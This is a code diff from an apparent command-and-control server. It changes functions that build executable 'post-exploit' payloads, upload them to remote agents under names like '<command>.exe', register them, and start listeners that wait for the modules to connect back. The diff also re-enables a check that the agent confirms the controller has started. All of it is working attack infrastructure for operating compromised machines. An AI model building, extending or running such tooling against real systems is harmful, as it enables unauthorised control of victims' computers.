@@ -221,9 +221,10 @@ def post_exploit_upload(conn, address, module_entry):
         return
 
     placeholder_values = edit_template_placeholders(module_entry)
-    temp_path = post_exploit_controller.build_temp_payload(module_entry, placeholder_values)
-    if not temp_path:
-        print(Fore.LIGHTRED_EX + "[-] Failed to generate temporary payload")
+    print(Fore.LIGHTCYAN_EX + "[+] Building post-exploit module...")
+    payload_path = post_exploit_controller.build_temp_payload(module_entry, placeholder_values, build_type="exe")
+    if not payload_path:
+        print(Fore.LIGHTRED_EX + "[-] Failed to build post-exploit module")
         input("OK")
         return
 
@@ -231,9 +232,10 @@ def post_exploit_upload(conn, address, module_entry):
         send_data(conn, b"MODE_REGISTER_POSTEXPLOIT")
         send_data(conn, module_entry["command"].encode())
         recv_data(conn)
-        send_data(conn, module_entry["file_name"].encode())
+        remote_name = f"{module_entry['command'].lower()}.exe"
+        send_data(conn, remote_name.encode())
         recv_data(conn)
-        upload(conn, address, temp_path, usename=False, send_mode=False)
+        upload(conn, address, payload_path, usename=False, send_mode=False)
         response = recv_data(conn)
         if response == "REGISTERED":
             print(Fore.LIGHTGREEN_EX + f"[+] Registered post-exploit: {module_entry['command']}")
@@ -242,7 +244,7 @@ def post_exploit_upload(conn, address, module_entry):
     except Exception as e:
         print(Fore.LIGHTRED_EX + f"[-] Error: {e}")
     finally:
-        post_exploit_controller.cleanup_temp_payload(temp_path)
+        post_exploit_controller.cleanup_temp_payload(payload_path)
     input("OK")
 
 
@@ -260,20 +262,25 @@ def post_exploit_controller_session(conn, address, module_entry, server_host):
 
     port, stop_event, controller_thread = post_exploit_controller.start_module_controller(module_entry, bind_host=server_host)
     if not port or not controller_thread:
-        print(Fore.LIGHTRED_EX + f"[-] Failed to start module controller listener. [{"NOT PORT" if not port else ""} : {"NOT THREAD" if not controller_thread else ""}]")
+        missing = []
+        if not port:
+            missing.append("port")
+        if not controller_thread:
+            missing.append("thread")
+        print(Fore.LIGHTRED_EX + f"[-] Failed to start module controller listener ({', '.join(missing)})")
         input("OK")
         return
 
     try:
         send_data(conn, b"MODE_START_POSTEXPLOIT")
         send_data(conn, module_entry["command"].encode())
-        #response = recv_data(conn) TODO
-        """if response != "CONTROLLER_STARTED":
+        response = recv_data(conn)
+        if response != "CONTROLLER_STARTED":
             print(Fore.LIGHTRED_EX + f"[-] Failed to start post exploit on agent: {response}")
             stop_event.set()
             controller_thread.join(1)
             input("OK")
-            return"""
+            return
 
         print(Fore.LIGHTCYAN_EX + f"[+] Controller started: {post_exploit_controller.get_controller_label(module_entry)}")
         print(Fore.LIGHTCYAN_EX + f"[+] Waiting for module connection on {server_host}:{port}")
